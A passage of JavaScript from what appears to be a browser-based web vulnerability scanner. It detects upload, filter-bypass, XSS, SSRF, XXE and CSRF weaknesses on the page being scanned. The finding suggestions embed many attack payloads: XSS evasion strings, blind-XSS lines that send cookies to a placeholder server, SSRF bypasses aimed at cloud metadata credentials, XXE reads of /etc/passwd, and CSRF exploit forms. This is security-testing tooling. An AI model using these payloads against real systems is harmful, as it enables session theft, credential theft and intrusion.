php/.jpg: filename="shell.php/.jpg" (bypasses extension check)\n  Semicolon: shell.php;.jpg (IIS parses up to ;)\n  Trailing dots/spaces: shell.php. or "shell.php " (Windows strips)`
        });
    });

    // Detect upload libraries/frameworks
    const uploadLibs = [
      { pattern: /dropzone/i, name: "Dropzone.js" },
      { pattern: /fine-?uploader/i, name: "Fine Uploader" },
      { pattern: /plupload/i, name: "Plupload" },
      { pattern: /blueimp.*upload|jquery.*upload/i, name: "jQuery File Upload" },
      { pattern: /tus-js-client|tus\.io/i, name: "tus.io resumable upload" },
      { pattern: /filepond/i, name: "FilePond" },
      { pattern: /uppy/i, name: "Uppy" },
    ];

    for (const { pattern, name } of uploadLibs) {
      if (pattern.test(html)) {
        findings.push({
          type: "Bypass — Upload Library Detected",
          severity: "medium",
          detail: `${name} upload library detected — intercept and modify the upload request`,
          location: "Page source",
          category: "upload-bypass",
          suggestion: `Bypass ${name} client-side validation:\n• Intercept XHR/fetch in Burp proxy\n• Modify Content-Type header in transit\n• Change filename in multipart boundary\n• Remove file size checks by modifying JS\n• Upload to alternate chunk/resume endpoint`
        });
      }
    }

    return findings;
  }

  // ── 14. Input Filter / Sanitization Bypass Indicators ──

  function detectFilterBypass(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);
    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 100000);

    // Client-side validation/filtering patterns
    const filterPatterns = [
      { pattern: /replace\s*\(\s*['"`]\s*[<>'"\\;|&$`]\s*['"`]/g, name: "Character stripping", count: 0 },
      { pattern: /replace\s*\(\s*\/[^/]*(?:select|union|insert|drop|script|alert|onerror|onload)[^/]*\//gi, name: "Keyword blacklist filter", count: 0 },
      { pattern: /sanitize|escape|filter|validate|clean|purify|strip/gi, name: "Sanitization function", count: 0 },
      { pattern: /encodeURIComponent|encodeURI|escape\(/g, name: "URL encoding", count: 0 },
      { pattern: /DOMPurify|sanitize-?html|xss-?filter|helmet/gi, name: "XSS sanitization library", count: 0 },
      { pattern: /maxlength|max_?length|max_?len/gi, name: "Length restriction", count: 0 },
      { pattern: /pattern\s*=\s*["'][^"']+["']/g, name: "Regex pattern attribute", count: 0 },
    ];

    for (const fp of filterPatterns) {
      const matches = scripts.match(fp.pattern);
      if (matches) {
        fp.count = matches.length;
      }
    }

    const activeFilters = filterPatterns.filter(f => f.count > 0);

    if (activeFilters.length > 0) {
      findings.push({
        type: "Bypass — Client-Side Filters Detected",
        severity: "medium",
        detail: `Found ${activeFilters.length} filter type(s): ${activeFilters.map(f => `${f.name} (${f.count}x)`).join(", ")}`,
        location: "Inline scripts",
        category: "filter-bypass",
        suggestion: `Client-side filter bypass (all are bypassable — server-side is what matters):\n• Disable JS and submit directly via curl/Burp\n• Modify the JS in DevTools to remove checks\n• Send request directly to API endpoint, skipping the form\n• Override validate/submit functions in console\n\nServer-side filter bypass techniques:\n• Encoding: URL (%27), double-URL (%2527), hex (0x27), Unicode (\\u0027)\n• Case variation: SeLeCT, ScRiPt\n• Null bytes: sel%00ect, %00' OR 1=1\n• Concatenation: CONC||AT, 'sel'||'ect'\n• Comment injection: SEL/**/ECT, UN/**/ION\n• Whitespace alternatives: %09(tab) %0a(newline) %0d(CR) %0c(FF) %a0(nbsp)\n• Scientific notation for numbers: 1e0UNION\n• String functions: CHAR(39) for quote, CHR(39) in Oracle\n• Alternate syntax: GROUP BY + HAVING for error info, BENCHMARK() for time-based\n• HTTP Parameter Pollution: split payload across duplicate params\n• Overlong payloads: exhaust filter inspection buffer\n\n⚡ CROSS-CORRELATION: If XSS filter found, test same bypass patterns on other vuln classes:\n• SQLi: same encoding/case tricks bypass SQL filters too\n• SSRF: URL-encode internal IPs through same filter\n• CSRF: if filter strips tokens, CSRF may work\n• File upload: encoding tricks may bypass extension filters\n• CMDi: same null byte/encoding bypasses apply to command filters`
      });
    }

    // Detect if page reflects input. searchParams values are URL-decoded, so if the value
    // contains raw < or > AND appears verbatim in the HTML, the output is UNENCODED (real XSS
    // signal). A plain reflection (no special chars, or encoded on output) is only an INFO
    // indicator — reflection alone is not proof of XSS.
    const params = new URL(ctx.url).searchParams;
    for (const [key, value] of params) {
      if (value.length > 2 && value.length < 200 && html.includes(value)) {
        const unencoded = /[<>]/.test(value); // raw angle brackets present verbatim in output
        if (unencoded) {
          findings.push({
            type: "Reflected XSS — Unencoded Reflection",
            severity: "medium",
            detail: `Parameter "${key}" is reflected in the page with unencoded < or > characters — likely reflected XSS. Confirm script execution to verify.`,
            location: ctx.url,
            category: "xss",
            evidence: "raw < or > from the parameter appears unencoded in the response",
            suggestion: `Confirm with a payload:\n• HTML context: <img src=x onerror=alert(1)>\n• Attribute context: " onmouseover="alert(1)\n• JS context: ';alert(1)//\n• Polyglot: jaVasCript:/*-/*\`/*\\/*'/*"/**/(/* */oNcliCk=alert() )//`
          });
        } else {
          findings.push({
            type: "Indicator — Input Reflection",
            severity: "info",
            detail: `Parameter "${key}" value is reflected in the page, but no unencoded special characters were observed. Reflection alone is not XSS — verify whether < > " ' are encoded on output.`,
            location: ctx.url,
            category: "xss",
            evidence: "value reflected without unencoded special characters",
            suggestion: `Manually inject and check encoding:\n• Try <img src=x onerror=alert(1)> in "${key}" and view source — if it renders as an element, it is XSS; if shown as text (&lt;img&gt;), output is encoded (not exploitable).`
          });
        }
      }
    }

    // Check for disabled form elements (often re-enable to bypass)
    const disabledInputs = document.querySelectorAll("input[disabled], select[disabled], textarea[disabled], button[disabled]");
    if (disabledInputs.length > 0) {
      const names = [...disabledInputs].map(el => el.name || el.id || el.type).filter(Boolean).slice(0, 5);
      findings.push({
        type: "Bypass — Disabled Form Elements",
        severity: "low",
        detail: `${disabledInputs.length} disabled form element(s): ${names.join(", ")}`,
        location: ctx.url,
        category: "filter-bypass",
        suggestion: "Remove 'disabled' attribute in DevTools and submit — server may still process these fields"
      });
    }

    // Check for readonly fields
    const readonlyInputs = document.querySelectorAll("input[readonly], textarea[readonly]");
    if (readonlyInputs.length > 0) {
      const names = [...readonlyInputs].map(el => el.name || el.id).filter(Boolean).slice(0, 5);
      findings.push({
        type: "Bypass — Readonly Form Fields",
        severity: "low",
        detail: `${readonlyInputs.length} readonly field(s): ${names.join(", ")}`,
        location: ctx.url,
        category: "filter-bypass",
        suggestion: "Remove 'readonly' in DevTools or modify value via fetch/curl directly — readonly is client-side only"
      });
    }

    // Hidden iframes (potential clickjacking or sandbox bypass)
    const hiddenFrames = document.querySelectorAll("iframe[style*='display:none'], iframe[style*='display: none'], iframe[hidden], iframe[width='0'], iframe[height='0']");
    if (hiddenFrames.length > 0) {
      findings.push({
        type: "Bypass — Hidden Iframes",
        severity: "low",
        detail: `${hiddenFrames.length} hidden iframe(s) detected — may load sensitive content or enable clickjacking`,
        location: ctx.url,
        category: "filter-bypass",
        suggestion: "Inspect iframe src URLs — they may expose internal endpoints, admin panels, or cross-origin resources"
      });
    }

    return findings;
  }

  // ── 15. XSS (Cross-Site Scripting) — All Sub-Types ──

  function detectXSS(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html.slice(0, 150000);
    const parsed = new URL(url);
    const params = [...parsed.searchParams.entries()];
    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 100000);

    // ── Reflected XSS ──
    for (const [key, value] of params) {
      if (value.length < 3 || value.length > 200) continue;
      if (!html.includes(value)) continue;
      const idx = html.indexOf(value);
      const before = html.slice(Math.max(0, idx - 60), idx);
      const after = html.slice(idx + value.length, idx + value.length + 60);
      let context = "HTML body";
      if (/<script[^>]*>[^<]*$/.test(before)) context = "JavaScript context";
      else if (/<style[^>]*>[^<]*$/.test(before)) context = "CSS context";
      else if (/=\s*["']?$/.test(before)) context = "HTML attribute value";
      else if (/<[a-z][^>]*$/.test(before)) context = "inside HTML tag";
      else if (/<!--/.test(before) && !(/-->/.test(before.slice(before.lastIndexOf("<!--"))))) context = "HTML comment";

      // P2/P5 (encoding-aware reflection): flag "XSS — Reflected" ONLY when a dangerous HTML
      // metacharacter is reflected UNENCODED (verbatim match ⇒ the metachar is unencoded here;
      // had the app encoded it, the match would have failed). When the reflected value carries
      // NO metacharacter we can't tell encoded from raw with a benign value — so we do NOT emit
      // a "likely safe" verdict here (that over-corrected and under-called real reflected-XSS
      // routes like /xss/reflected?q=test). The dedicated reflection detector still emits the
      // tier-1 "Indicator — Input Reflection" for that case; we simply defer to it.
      if (!/[<>"'`]/.test(value)) continue;

      const contextPayloads = {
        "HTML body": '<img src=x onerror=alert(1)>  |  <svg/onload=alert(1)>  |  <details open ontoggle=alert(1)>',
        "HTML attribute value": '" onfocus=alert(1) autofocus="  |  \' onmouseover=alert(1) \'  |  " autofocus onfocus=alert(1)//',
        "JavaScript context": "';alert(1)//  |  \\';alert(1)//  |  </script><script>alert(1)</script>  |  '-alert(1)-'",
        "CSS context": "}</style><img src=x onerror=alert(1)>  |  expression(alert(1))",
        "inside HTML tag": ' onfocus=alert(1) autofocus  |  /><svg/onload=alert(1)>',
        "HTML comment": '--><img src=x onerror=alert(1)>',
      };

      findings.push({
        type: "XSS — Reflected",
        severity: "high",
        detail: `"${key}" reflected UNENCODED (raw HTML metacharacters preserved) in ${context} (${html.split(value).length - 1}x) — potential XSS, verify manually`,
        location: url, category: "xss",
        subtype: "reflected",
        suggestion: `Reflected XSS in ${context}:\n• Context payloads: ${contextPayloads[context] || contextPayloads["HTML body"]}\n• Filter evasion (from XSS Cheat Sheet):\n  If <script> blocked: <img src=x onerror=alert(1)> | <svg/onload=alert(1)> | <body onload=alert(1)>\n  If 'alert' blocked: confirm(1) | prompt(1) | print() | top["al"+"ert"](1) | window['a]lert'](1) | self['ale'+'rt'](1)\n  If () blocked: alert\`1\` | onerror=alert;throw 1 | {onerror=alert}throw 1\n  If quotes blocked: String.fromCharCode(88,83,83) | /regex/.source\n  If event handlers blocked: try all 20+ handlers:\n    onfocus, onblur, oninput, onchange, onmouseover, onmouseenter, onmousedown,\n    onmouseup, onclick, ondblclick, oncontextmenu, onwheel, ondrag, ondrop,\n    onkeydown, onkeyup, onkeypress, ontouchstart, ontouchend, ontouchmove,\n    onpointerover, onpointerenter, onpointerdown, ongotpointercapture,\n    onanimationstart, ontransitionend, onbeforetoggle, ontoggle,\n    onload, onerror, onresize, onscroll, onsubmit, onreset, oninvalid,\n    onfocusin, onfocusout, oncut, oncopy, onpaste, onselect, onsearch\n  Case mixing: <ScRiPt>alert(1)</ScRiPt> | <IMG SRC=x OnErRoR=alert(1)>\n  Null bytes: <scr%00ipt>alert(1)</script>\n  Double encoding: %253Cscript%253E (when server double-decodes)\n  HTML entities: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n  SVG: <svg><animate onbegin=alert(1) attributeName=x dur=1s>\n• Polyglot: jaVasCript:/*-/*\`/*\\/*'/*"/**/(/* */oNcliCk=alert())//\n• CSP bypass: <script src="data:,alert(1)"> | <base href="https://evil.com/">\n\n• BLIND XSS: This parameter is reflected — also inject blind XSS payloads:\n  <script src=https://YOUR-XSSHUNTER.xss.ht></script>\n  "><img src=x onerror="fetch('https://YOUR-SERVER/'+ctx.cookies)">\n  Reflected params may also appear in admin logs, email notifications, or error dashboards`
      });
    }

    // ── DOM-based XSS ──
    const domSources = [
      { p: /location\.hash/g, n: "location.hash", sink: "Fragment identifier" },
      { p: /location\.search/g, n: "location.search", sink: "Query string" },
      { p: /location\.href/g, n: "location.href", sink: "Full URL" },
      { p: /document\.referrer/g, n: "document.referrer", sink: "Referrer header" },
      { p: /document\.URL/g, n: "document.URL", sink: "Document URL" },
      { p: /window\.name/g, n: "window.name", sink: "Window name (cross-origin)" },
      { p: /document\.cookie/g, n: "ctx.cookies", sink: "Cookie value" },
      { p: /localStorage\./g, n: "localStorage", sink: "Local storage" },
      { p: /sessionStorage\./g, n: "sessionStorage", sink: "Session storage" },
      { p: /postMessage/g, n: "postMessage", sink: "Cross-origin message" },
      { p: /URL\.createObjectURL/g, n: "createObjectURL", sink: "Blob URL" },
    ];
    const domSinks = [
      { p: /\.innerHTML\s*=/g, n: "innerHTML" }, { p: /\.outerHTML\s*=/g, n: "outerHTML" },
      { p: /document\.write\s*\(/g, n: "document.write" }, { p: /document\.writeln\s*\(/g, n: "document.writeln" },
      { p: /eval\s*\(/g, n: "eval()" }, { p: /Function\s*\(/g, n: "Function()" },
      { p: /setTimeout\s*\(\s*['"]/g, n: "setTimeout(string)" }, { p: /setInterval\s*\(\s*['"]/g, n: "setInterval(string)" },
      { p: /\.insertAdjacentHTML/g, n: "insertAdjacentHTML" }, { p: /\.append\(/g, n: "append()" },
      { p: /\$\(\s*['"`].*\+/g, n: "jQuery selector injection" }, { p: /\.html\s*\(/g, n: "jQuery .html()" },
    ];

    const sourcesFound = domSources.filter(s => s.p.test(scripts)).map(s => s.n);
    const sinksFound = domSinks.filter(s => s.p.test(scripts)).map(s => s.n);

    if (sourcesFound.length > 0 && sinksFound.length > 0) {
      findings.push({
        type: "XSS — DOM-based",
        severity: "high",
        detail: `Sources: ${sourcesFound.join(", ")} → Sinks: ${sinksFound.join(", ")}`,
        location: "Inline scripts", category: "xss",
        subtype: "dom",
        suggestion: `DOM XSS — trace data from source to sink:\n• location.hash: #<img src=x onerror=alert(1)>\n• location.search: ?param=<svg/onload=alert(1)>\n• window.name: set via window.open() from attacker page\n• postMessage: send crafted message from iframe\n• Tools: DOM Invader (Burp), DOMPurify bypass research\n• Test innerHTML sinks with: <img src=x onerror=alert(1)>\n• Test eval sinks with: '-alert(1)-'\n• Test jQuery sinks with: <img src=x onerror=alert(1)>`
      });
    } else if (sourcesFound.length > 0) {
      findings.push({
        type: "XSS — DOM Source (no sink traced)",
        severity: "medium",
        detail: `DOM sources: ${sourcesFound.join(", ")} — trace manually to sinks`,
        location: "Inline scripts", category: "xss", subtype: "dom"
      });
    }

    // ── Stored XSS indicators (#28 enhanced field coverage) ──
    const storedIndicators = [
      /comment|review|feedback|message|post|reply|note|bio|description|profile|about|title|body|content|text|story|article|blog|summary|headline|subject|question|answer|response|status|update|announcement|memo|report|label|tag|caption|alt|placeholder|tooltip|notification|alert_text|display_name|nickname|first_?name|last_?name|full_?name|company|organization|address|city|state|country|website|homepage|url|link|signature|motto|slogan/i
    ];
    const forms = ctx.forms;
    forms.forEach((form, i) => {
      const inputs = [...form.querySelectorAll("textarea, input[type='text'], input:not([type]), [contenteditable='true']")];
      const textareas = form.querySelectorAll("textarea");
      const action = form.getAttribute("action") || "";
      const method = (form.getAttribute("method") || "GET").toUpperCase();
      const inputNames = inputs.map(el => el.name || el.id || "").filter(Boolean);
      const hasStoredNames = inputNames.some(n => storedIndicators.some(p => p.test(n)));

      if ((textareas.length > 0 || inputs.length > 2) && method === "POST" && hasStoredNames) {
        const matchedFields = inputNames.filter(n => storedIndicators.some(p => p.test(n)));
        findings.push({
          type: "XSS — Stored (potential)",
          severity: "high",
          detail: `Form #${i+1} (POST ${action||"self"}) has ${matchedFields.length} storable field(s): ${matchedFields.slice(0, 8).join(", ")} — content likely stored and rendered`,
          location: action || url, category: "xss",
          subtype: "stored",
          suggestion: `Stored XSS payloads — test ALL ${matchedFields.length} fields:\n${matchedFields.map(f => `• ${f}: <img src=x onerror=alert('${f}')>`).join("\n")}\n\nPayloads:\n• <script>alert(1)</script>\n• <img src=x onerror=alert(1)>\n• <svg/onload=alert(1)>\n• <body onload=alert(1)>\n• Markdown injection: [a]("onerror="alert(1))\n• If HTML sanitized: <a href="javascript:alert(1)">click</a>\n• Mutation XSS: <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>\n• Profile fields (name, bio, company) render on OTHER users' screens → true stored XSS\n• Test each field individually — different fields may have different sanitization`
        });
      }
    });

    // ── Blind XSS indicators ──
    // P5C: a blind-XSS lead requires an ACTUAL storable input sink (a POST form with a
    // free-text field), not merely the words "contact/support" appearing somewhere on the
    // page. Downgraded to INFO and only surfaced when such a form exists.
    const blindSinkForm = (ctx.forms || []).some(form => {
      if ((form.getAttribute("method") || "GET").toUpperCase() !== "POST") return false;
      if (form.querySelector("textarea")) return true;
      return [...form.querySelectorAll("input")].some(el => /message|comment|feedback|body|content|description|subject|inquiry|question|review|note/i.test((el.name || el.id || "")));
    });
    if (blindSinkForm && /contact|support|feedback|helpdesk|ticket|inquiry|report.*issue|bug.*report/i.test(html)) {
      findings.push({
        type: "XSS — Blind (storable form present)",
        severity: "info",
        detail: "A support/feedback form with a free-text field was found — IF its content is later rendered in an internal/admin view, a blind-XSS payload could fire there. Unconfirmed; needs an out-of-band callback to verify.",
        location: url, category: "xss",
        subtype: "blind",
        suggestion: `Only pursue with an OOB callback (XSS Hunter / interactsh):\n• Submit a callback payload in the free-text field and watch for a hit when staff view it.\n• Common sinks: message, subject, name — admin dashboards may render them unsanitized.`
      });
    }

    // ── Self-XSS / mXSS indicators ──
    if (/contenteditable|designMode|execCommand|innerHTML.*=.*user|innerHTML.*=.*input/i.test(scripts)) {
      findings.push({
        type: "XSS — mXSS / Self-XSS via contenteditable",
        severity: "medium",
        detail: "contenteditable/designMode or unsafe innerHTML with user input — mutation XSS vector",
        location: "Inline scripts", category: "xss",
        subtype: "mxss",
        suggestion: `Mutation XSS bypasses DOMPurify/sanitizers:\n• <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>\n• <svg><style><img src="</style><img onerror=alert(1) src=x>">\n• <form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src=x>">\n• Chain with CSRF to upgrade Self-XSS to full XSS`
      });
    }

    // ── Event handler density ──
    const evts = html.match(/\son\w+\s*=\s*["'][^"']*["']/gi);
    if (evts && evts.length > 8) {
      findings.push({ type: "XSS — Event Handler Density", severity: "info",
        detail: `${evts.length} inline event handlers — if any accept user input → XSS`,
        location: "Page source", category: "xss", subtype: "reflected" });
    }

    return findings;
  }

  // ── 16. SSRF — All Sub-Types ──

  function detectSSRF(ctx) {
    const findings = [];
    const url = ctx.url;
    const parsed = new URL(url);
    const html = ctx.html.slice(0, 100000);

    // ── Basic / Classic SSRF ──
    const ssrfParams = ["url","uri","src","source","dest","destination","redirect","target","link","feed","host","site","proxy","endpoint","api_url","fetch","load","request"];
    for (const [key, value] of parsed.searchParams) {
      if (REDIRECT_PARAMS.has(key.toLowerCase())) continue;
      if (ssrfParams.includes(key.toLowerCase())) {
        findings.push({
          type: "SSRF — Basic (URL parameter)",
          severity: "high",
          detail: `"${key}" takes URL input → server-side fetch`,
          location: url, category: "ssrf", subtype: "basic",
          suggestion: `SSRF bypass payloads (from bug bounty methodology):\n• Localhost variants:\n  http://127.0.0.1  |  http://localhost  |  http://[::1]\n  http://0x7f000001 (hex)  |  http://2130706433 (decimal)  |  http://0177.0.0.1 (octal)\n  http://0  |  http://127.1  |  http://127.0.1  |  http://0x7f.0x0.0x0.0x1\n  http://[0:0:0:0:0:ffff:127.0.0.1]  |  http://[::ffff:7f00:1]\n  http://①②⑦.⓪.⓪.① (unicode)\n  http://127.0.0.1.nip.io  |  http://localtest.me\n• Cloud metadata (169.254.169.254 bypasses):\n  http://169.254.169.254 → http://0xa9fea9fe (hex)  |  http://2852039166 (decimal)\n  http://[::ffff:a9fe:a9fe]  |  http://169.254.169.254.nip.io\n  AWS: /latest/meta-data/iam/security-credentials/ → /latest/api/token (IMDSv2: PUT with header)\n  GCP: http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)\n  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n  DigitalOcean: http://169.254.169.254/metadata/v1/\n• Redirect chain: host a 302 redirect on your server → http://169.254.169.254/...\n• Protocol smuggling: gopher://127.0.0.1:6379/_REDIS_CMD  |  dict://  |  file:///etc/passwd\n• DNS rebinding: rebind.it, 1u.ms, or your own DNS server alternating 1.2.3.4 ↔ 127.0.0.1\n• URL parsing tricks:\n  http://evil.com#@127.0.0.1  |  http://evil.com\\@127.0.0.1\n  http://127.0.0.1:80\\@evil.com  |  http://127.0.0.1%2523@evil.com`
        });
      }
    }

    // ── Blind SSRF (callback/webhook) ──
    // Look for actual webhook/callback URL inputs, not generic JS callback patterns
    const webhookInputs = [...document.querySelectorAll('input[name*="webhook" i], input[name*="callback_url" i], input[name*="notify_url" i], input[name*="ipn_url" i], input[name*="hook_url" i], input[name*="ping_url" i]')];
    const webhookParams = [...parsed.searchParams.keys()].filter(k => /webhook|callback_url|notify_url|ipn_url|hook_url|ping_url/i.test(k));
    if (webhookInputs.length > 0 || webhookParams.length > 0) {
      findings.push({
        type: "SSRF — Blind (webhook/callback)",
        severity: "high",
        detail: `Webhook/callback input: ${webhookInputs.map(i => i.name).concat(webhookParams).join(", ")} — server makes outbound request`,
        location: url, category: "ssrf", subtype: "blind",
        suggestion: `Blind SSRF — use OOB to confirm:\n• Burp Collaborator / interact.sh / webhook.site\n• Set callback to: http://YOUR-COLLABORATOR.burpcollaborator.net\n• If confirmed, escalate: point to internal services (Redis:6379, Memcached:11211, Elasticsearch:9200)\n• Try SSRF→RCE chains via internal services`
      });
    }

    // P5F: SSRF via PDF/Screenshot generation removed as a page-keyword detector — it fired
    // merely because words like "puppeteer"/"headless"/"screenshot" appeared in page text
    // (rife on security sites), with no injectable input. Real URL/HTML inputs are already
    // covered by the parameter-based SSRF checks above.

    // ── SSRF via image/avatar/import URLs ──
    const imgParams = ["image","img","avatar","icon","logo","photo","picture","thumbnail","preview","import_url","image_url","pic","banner"];
    for (const [key] of parsed.searchParams) {
      if (imgParams.includes(key.toLowerCase())) {
        findings.push({
          type: "SSRF — Image/Avatar Fetch",
          severity: "medium",
          detail: `"${key}" fetches images server-side — partial SSRF`,
          location: url, category: "ssrf", subtype: "partial",
          suggestion: `Partial SSRF via image fetch:\n• May only allow image/* responses — try:\n• SVG with embedded script pointing to internal\n• Redirect chain: your-server → 302 → http://169.254.169.254/...\n• DNS rebinding to bypass domain allowlists\n• Large image DoS: image pointing to /dev/urandom`
        });
      }
    }

    // P5F: DNS-rebinding "vector" removed — it fired on any page containing the words
    // dns/resolve/lookup, which is not evidence of an SSRF sink.

    // ── SSRF via redirect chain ──
    const redirectLinks = [...document.querySelectorAll("a[href]")].filter(a => {
      const h = a.href.toLowerCase();
      return /[?&](redirect|url|uri|next|goto|return|dest|target|forward|out|rurl|continue)=/i.test(h);
    });
    if (redirectLinks.length > 0 && findings.some(f => f.category === "ssrf")) {
      findings.push({
        type: "SSRF — Redirect Chain",
        severity: "high",
        detail: `${redirectLinks.length} redirect endpoint(s) on page + SSRF detected — chain redirect → internal access`,
        location: url, category: "ssrf", subtype: "redirect-chain",
        suggestion: `SSRF via redirect chain:\n• Host a 302 redirect on your server: your-server.com/redir → http://169.254.169.254/...\n• Use the open redirect found on this page as the first hop\n• Multi-hop: SSRF param → open redirect → internal service\n• Bypasses domain allowlists that only check initial URL`
      });
    }

    return findings;
  }

  // ── 17. XXE — All Sub-Types ──

  function detectXXE(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);

    // P5F: only flag XXE when the app plausibly ACCEPTS user-supplied XML — an XML/SOAP file
    // upload, or a SOAP/WSDL endpoint. Page-text mentions of xmlns/DOMParser/.xml (present on
    // any site with an SVG, RSS link, or client-side XML parsing) are NOT evidence of a sink.
    const xmlFileUpload = [...document.querySelectorAll('input[type="file"]')].some(el => /xml|soap/i.test(el.getAttribute("accept") || ""));
    const soapSurface = /\bwsdl\b|\.asmx\b|application\/soap|<\s*soap[:\s]/i.test(html);
    if (xmlFileUpload || soapSurface) {
      findings.push({
        type: "XXE — Possible (XML input surface)",
        severity: "medium",
        detail: `${xmlFileUpload ? "An XML/SOAP file upload" : "A SOAP/WSDL endpoint"} is present — IF the server parses XML with external entities enabled, XXE is possible. Unconfirmed; requires submitting a crafted XML document.`,
        location: "Page source", category: "xxe", subtype: "classic",
        suggestion: `Only where you can submit XML:\n• <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>\n• If the entity is not reflected, try OOB exfiltration via an external DTD to your collaborator.`
      });
    }

    // SOAP
    if (/soap|wsdl|\.asmx/i.test(html)) {
      findings.push({ type: "XXE — SOAP Endpoint", severity: "high", detail: "SOAP/WSDL parses XML by design", location: "Page source", category: "xxe", subtype: "soap",
        suggestion: "Inject XXE in SOAP envelope body. SOAP services rarely disable external entities." });
    }

    // SVG/DOCX upload
    if (/type\s*=\s*["']?file["']?/i.test(html)) {
      if (/accept\s*=\s*["'][^"']*(?:svg|xml|docx|xlsx|pptx)/i.test(html) || !/accept\s*=/.test(html.match(/<input[^>]*type\s*=\s*["']?file["']?[^>]*/i)?.[0] || "")) {
        findings.push({ type: "XXE — File Upload (SVG/DOCX)", severity: "medium", detail: "File upload may accept SVG/DOCX/XLSX — all are XML-based", location: "Page source", category: "xxe", subtype: "file-upload",
          suggestion: `XXE via file upload:\n• SVG: <svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>\n• DOCX: Inject in [Content_Types].xml or word/document.xml\n• XLSX: Inject in xl/sharedStrings.xml\n• XInclude: <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>` });
      }
    }

    return findings;
  }

  // ── 18. CSRF — All Sub-Types ──

  // P5A: recognize CSRF defenses under any of the common token names (csrf, _csrf,
  // csrf_token, csrfmiddlewaretoken, authenticity_token, RequestVerificationToken,
  // __RequestVerificationToken, _token, xsrf, anti-forgery, synchronizer token) across form
  // inputs, page meta tags, cookies (Angular XSRF-TOKEN / Django csrftoken), and header-based
  // setups referenced in inline scripts. If any is present, do NOT flag missing-CSRF.
  const CSRF_TOKEN_RE = /csrf|xsrf|authenticity[_-]?token|request[_-]?verification|anti-?forgery|csrfmiddlewaretoken|(?:^|[^a-z0-9])_token(?:[^a-z0-9]|$)|__csrf|verif(?:ication)?[_-]?token|synchronizer[_-]?token/i;
  function pageHasCsrfDefense(ctx) {
    try {
      if ([...document.querySelectorAll("input[name],input[id]")].some(el => CSRF_TOKEN_RE.test(el.name || "") || CSRF_TOKEN_RE.test(el.id || ""))) return true;
      if ([...document.querySelectorAll("meta[name]")].some(m => CSRF_TOKEN_RE.test(m.getAttribute("name") || ""))) return true;
      if (CSRF_TOKEN_RE.test(ctx.cookies || (typeof document !== "undefined" ? document.cookie : "") || "")) return true;
      const js = (ctx.inlineScripts || []).map(s => s.textContent || "").join("\n").slice(0, 60000);
      if (/x-csrf-token|x-xsrf-token|requestverificationtoken|anti-?forgery/i.test(js)) return true;
    } catch {}
    return false;
  }

  function detectCSRF(ctx) {
    const findings = [];
    const forms = ctx.forms;
    const url = ctx.url;
    const csrfDefended = pageHasCsrfDefense(ctx); // page-level token (meta/cookie/header) recognised once

    forms.forEach((form, i) => {
      const action = form.getAttribute("action") || "";
      const method = (form.getAttribute("method") || "GET").toUpperCase();
      if (method === "GET") return;
      const hasToken = csrfDefended || form.querySelector('input[name*="csrf" i], input[name*="token" i], input[name*="authenticity" i], input[name*="nonce" i], input[name*="xsrf" i], input[name*="verification" i], input[name*="forgery" i]');
      const inputs = [...form.querySelectorAll("input,textarea,select")].map(el => el.name).filter(Boolean);
      const isLogin = inputs.some(n => /user|email|login/i.test(n)) && inputs.some(n => /pass|pwd/i.test(n));
      const isStateChanging = inputs.some(n => /email|password|delete|transfer|amount|role|admin|setting|update|edit|create|remove|add/i.test(n));

      if (!hasToken) {
        const subtype = isLogin ? "login-csrf" : isStateChanging ? "state-changing" : "standard";
        findings.push({
          type: `CSRF — ${isLogin ? "Login CSRF" : isStateChanging ? "State-Changing" : "No Token"}`,
          severity: isStateChanging ? "high" : "medium",
          detail: `POST form #${i+1} (${action||"self"}) — no CSRF token [fields: ${inputs.slice(0,5).join(", ")}]`,
          location: action || url, category: "csrf", subtype,
          suggestion: isLogin
            ? `Login CSRF:\n• Force victim to log into attacker's account\n• Attacker plants data, victim sees it as their own\n• Chain: login CSRF → stored XSS in attacker account → steal victim session`
            : `CSRF exploit:\n• <form action="${action||url}" method="POST">${inputs.map(n=>`<input name="${n}" value="EVIL">`).join("")}<input type="submit"></form>\n• <script>document.forms[0].submit()</script>\n• JSON CSRF: fetch('${action||url}',{method:'POST',body:JSON.stringify({...}),credentials:'include'})\n• Check SameSite cookie, Referer/Origin validation\n\n⚡ Referer/Origin bypass techniques:\n• Remove Referer entirely: <meta name="referrer" content="no-referrer">\n• Subdomain referer: host CSRF page on sub.target.com (if XSS on subdomain)\n• Referer containing target: https://evil.com/target.com/csrf.html\n• Data URI iframe: <iframe src="data:text/html,..."> sends no referer\n• HTTPS→HTTP: referer stripped on protocol downgrade\n• Referer header manipulation via 302 redirect chain\n• window.history.replaceState to spoof document.referrer\n• If only Origin checked: some browsers omit Origin on same-site navigations`
        });
      } else {
        // P3: a CSRF token is present — do NOT flag the form by default (this was a false
        // positive on /csrf/with-token: `hasToken` can be a boolean when the page defence is a
        // meta/cookie, and reading `.value` off it gave length 0). Only flag a GENUINELY weak
        // token — very short (≤6) or purely numeric. A long random/hex token is fine.
        const formToken = form.querySelector('input[name*="csrf" i], input[name*="token" i], input[name*="authenticity" i], input[name*="nonce" i], input[name*="xsrf" i], input[name*="verification" i], input[name*="forgery" i]');
        const tv = String((formToken && formToken.value) || "");
        if (tv.length > 0 && (tv.length <= 6 || /^\d+$/.test(tv))) {
          findings.push({ type: "CSRF — Weak Token", severity: "low", detail: `Form #${i+1}: token "${truncate(tv, 20)}" is short/predictable (${tv.length} chars)`, location: action||url, category: "csrf", subtype: "weak-token",
            suggestion: "Verify the token is unpredictable and per-session. Test: remove token, reuse an old token, use another user's token, change HTTP method." });
        }
      }
    });

